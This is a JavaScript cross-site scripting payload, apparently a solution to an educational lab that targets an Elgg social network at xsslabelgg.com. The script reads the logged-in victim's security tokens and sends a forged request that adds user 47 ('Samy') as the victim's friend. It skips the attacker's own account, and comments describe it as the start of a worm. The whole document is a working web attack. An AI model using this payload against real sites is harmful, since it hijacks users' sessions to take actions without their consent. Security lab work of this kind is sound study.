
<script type="text/javascript">
    var id = elgg.get_logged_in_user_guid();


	if( id != 47)
	{
        //Firstly get the logged in user Id  . If the user is samy we ignore the attack
        //as  the attacker's profile shouldn't be replicated by the warm again

        
        window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.


        //We can get the url by triggering the add friend feature of the UI and inspect 
        //the network tag
        var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+token+ts;; //FILL IN
        Ajax=new XMLHttpRequest();
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
	    }
    }
</script>